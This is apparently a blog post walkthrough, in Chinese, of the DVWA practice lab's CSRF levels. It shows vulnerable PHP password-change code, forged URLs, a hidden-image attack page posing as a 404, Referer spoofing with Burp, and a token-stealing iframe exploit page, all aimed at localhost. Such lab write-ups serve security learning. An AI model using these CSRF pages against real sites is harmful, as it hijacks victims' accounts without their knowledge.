@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>dvwa-CSRF | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="CSRF">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="dvwa-CSRF">
+<meta name="keywords" content="CSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dvwa-CSRF">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/48103/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="dvwa-CSRF">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-CSRF/10.png">
+<meta property="og:updated_time" content="2018-07-13T16:32:30.852Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dvwa-CSRF">
+<meta name="twitter:description" content="dvwa-CSRF">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/dvwa-CSRF/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">dvwa-CSRF</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Low"><span class="post-toc-number">1.</span> <span class="post-toc-text">Low</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Medium"><span class="post-toc-number">2.</span> <span class="post-toc-text">Medium</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#High"><span class="post-toc-number">3.</span> <span class="post-toc-text">High</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-dvwa-CSRF"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">dvwa-CSRF</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-07-13 14:26:00" datetime="2018-07-13T06:26:00.000Z"  itemprop="datePublished">2018-07-13</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/dvwa-CSRF/">dvwa-CSRF</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">8</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>总结了dvwa中关于跨网站请求伪造的一些关卡<a id="more"></a></p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connection.php"</span>);</span><br><span class="line"></span><br><span class="line">$pass_new=$_GET[<span class="string">'password_new'</span>];</span><br><span class="line">$pass_conf=$_GET[<span class="string">'password_conf'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'password_new'</span>] == $_GET[<span class="string">'password_conf'</span>])&#123;</span><br><span class="line">	$pass_new=mysql_real_escape_string($pass_new);</span><br><span class="line">	$pass_new=md5($pass_new);</span><br><span class="line">	$username=$_COOKIE[<span class="string">'Username'</span>];</span><br><span class="line"></span><br><span class="line">	$sql=<span class="string">"UPDATE users SET password='$pass_new' WHERE user='$username'"</span>;</span><br><span class="line">	$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Your password has changed"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Password didn't match"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从源代码可以看出，这是一个修改密码的程序，而$username是取决于中cookie的Username字段值，也就是说，当我们以一个用户身份登录时，服务器会将用户的信息保存在cookie中，下次访问时，就不需要再登录，浏览器直接按之前保存的身份信息登录。这就可能导致了一种CSRF（Cross-site request forgery,跨网站请求伪造）的漏洞，因为修改的密码都是以GET的形式发送给服务器，所以攻击者可以伪造一个url，诱导受害者去点击，受害者一旦点击，如果浏览器之前保存了身份认证信息，用户的密码就会被恶意修改，它与XSS的区别在于，它并没有盗取用户的cookie，而是直接利用用户的cookie，从而完成非法操作。</p>
+<p>构造链接：</p>
+<p>(1)最基础的链接：<a href="http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change" target="_blank" rel="noopener">http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change</a></p>
+<p>当受害者点击了这个链接，他的密码直接就会被修改成hack</p>
+<p>但是这种链接简单直白的告诉了稍微看得懂一点url的人…很明显的就是想篡改他的密码，也就只能骗一骗那些完全不懂的小白</p>
+<p>需要注意的是，CSRF最关键的就是利用用户的cookie向服务器发送伪造请求，也就是说，如果浏览器未保存用户的身份信息，那受害者点击链接时就会自动进入登录界面，攻击就失效了</p>
+<p>有保存用户信息的浏览器，比如Chrome浏览器</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>Chrome的检查功能可以很明显的看到保存了cookie信息</p>
+<p>而有些浏览器未能保存cookie信息，CSRF攻击就实现不了</p>
+<p>(2)构造短链接</p>
+<p>利用百度短网址系统将网址缩短成一个短网址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>由于是本地搭的环境，所以生成不了，实际场景下目标服务器不是域名的话是可以生成短链接的</p>
+<p>这种方法虽然链接看起来不像是攻击链接，但是受害者依然能看到修改密码成功的提示信息</p>
+<p>(3)构造攻击页面</p>
+<p>为了能让用户点击攻击链接，又能不让用户察觉到自己的密码被修改了，我们可以构造一个页面，里面包含了攻击链接，让用户去点击</p>
+<p>我们写一个test.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;http://127.0.0.1/demo/CSRF/low-change.php?password_new=hack&amp;password_conf=hack&amp;change=change&quot; style=&quot;display:none&quot;&gt;</span><br><span class="line">&lt;h1&gt;404&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>当受害者访问这个页面时，一个看不见的图片标签就自动访问了修改密码的页面，受害者还误以为自己访问了一个失效的url，实际上自己的密码已经被修改为了hack</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;change&apos;]))&#123;</span><br><span class="line">	if(eregi($_SERVER[&apos;SERVER_NAME&apos;],$_SERVER[&apos;HTTP_REFERER&apos;]))&#123;</span><br><span class="line">		$pass_new=$_GET[&apos;password_new&apos;];</span><br><span class="line">		$pass_conf=$_GET[&apos;password_conf&apos;];</span><br><span class="line">		$username=$_COOKIE[&apos;Username&apos;];</span><br><span class="line"></span><br><span class="line">		if($pass_new == $pass_conf)&#123;</span><br><span class="line">			$pass_new=mysql_real_escape_string($pass_new);</span><br><span class="line">			$pass_new=md5($pass_new);</span><br><span class="line">			$sql=&quot;UPDATE users SET password=&apos;$pass_new&apos; WHERE user=&apos;$username&apos;&quot;;</span><br><span class="line">			$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">			echo &quot;Your password has changed&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			echo &quot;Password didn&apos;t match&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		echo &quot;That request didn&apos;t look correct&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>与上一关的区别在于这里加了一个过滤条件，首先先查一下eregi函数的用法</p>
+<p>eregi(string pattern,string string):在一个字符串string中搜索指定模式pattern的字符串，不分大小写，如果匹配成功则返回true，不成功则返回false</p>
+<p>再查阅一下全局变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;SERVER_NAME&apos;]:http包头的Host参数，即要访问的主机名</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]:http包头的Referer参数的值，表示来源地址</span><br></pre></td></tr></table></figure>
+<p>看完不理解也没事，我们利用burp抓包看一下就大概明白了</p>
+<p>我们先在提交的表单中输入password为hack</p>
+<p>然后点击提交</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>然后用burp抓包</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>Host值就是要访问的主机名，Referer值就是来源地址</p>
+<p>这是在网页中的表单中提交数据，所以来源地址是这个网页的地址</p>
+<p>我们最终访问主机名一定是127.0.0.1,所以127.0.0.1一定要出现在Referer值中，这起到了一定的过滤作用，如果受害者访问我们伪造的攻击网站，攻击网站向服务器发出伪造请求，会被服务器检测来源地址，地址中不带127.0.0.1的话，就会被过滤掉，但是这种过滤很好解决，即使不理解上面两个参数的意思，我们只要用burp修改请求头的Host和Referer参数，让两个参数都带有一样的内容就ok了</p>
+<p>我们在浏览器中访问<a href="http://127.0.0.1/demo/CSRF/medium-change.php?password_new=hack&amp;password_conf=hack&amp;change=change" target="_blank" rel="noopener">http://127.0.0.1/demo/CSRF/medium-change.php?password_new=hack&amp;password_conf=hack&amp;change=change</a></p>
+<p>然后用burp抓包</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>我们看到请求头中只有Host参数，没有Referer参数，这是因为我们是在空白的页面访问的，所以没有来源地址，这时候点击go</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现请求被过滤了</p>
+<p>我们在请求头中添加Referer参数，随便输入一个带127.0.0.1的值</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>添加Referer参数后修改密码成功</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Do the passwords match? </span><br><span class="line">    if( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        // They do! </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        // Update the database </span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; </span><br><span class="line">        $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">        // Feedback for the user </span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Issue with passwords matching </span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这关加入了token认证机制，能非常有效的预防CSRF攻击，它的防御过程如下：</p>
+<p>(1)每当用户登录后会随机产生一段字符串，并且存储在Session或者Cookie中</p>
+<p>(2)在敏感操作中加入隐藏标签，value即为Session中保存的字符串，如本关中的表单加入了隐藏标签，提交的内容就是Session中保存的字符串</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>(3)用户提交请求后，服务器将请求提交的Token字符串与Session中的字符串进行比较，如果一致，则认为是正常请求，否则可能是CSRF攻击</p>
+<p>(4)更新Token值</p>
+<p>所以，要绕过Token认证，就必要想办法获得存储在Session或者Cookie当中的Token值</p>
+<p>破解token认证思路是在攻击页面上利用隐藏的iframe框架访问修改密码的页面，然后用javascript代码获取页面token值再赋值给攻击页面表单，再模拟提交隐藏表单</p>
+<p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;high-attack&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	function attack()</span><br><span class="line">	&#123;</span><br><span class="line">		document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&apos;hack&apos;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;</span><br><span class="line">		document.getElementById(&apos;transfer&apos;).submit();</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot; id=&apos;hack&apos; border=&apos;0&apos; style=&apos;display:none&apos;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=&quot;transfer&quot; method=&apos;get&apos; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后在浏览器输入攻击页面url，跳转到修改密码的页面</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-CSRF/10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以看到成功获取token值并修改密码成功</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-07-13T16:32:30.852Z" itemprop="dateUpdated">2018-07-14 00:32:30</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/48103/" target="_blank" rel="external">https://Foxgrin.github.io/posts/48103/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSRF/">CSRF</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/48103/&title=《dvwa-CSRF》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/48103/&title=《dvwa-CSRF》 — Somnus's blog&source=总结了dvwa中关于跨网站请求伪造的一些关卡" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/48103/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《dvwa-CSRF》 — Somnus's blog&url=https://Foxgrin.github.io/posts/48103/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/48103/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/22283/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：dvwa-Brute Force
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/29757/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：使用Hexo+github搭建属于自己的博客">下一篇：使用Hexo+github搭建属于自己的博客</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
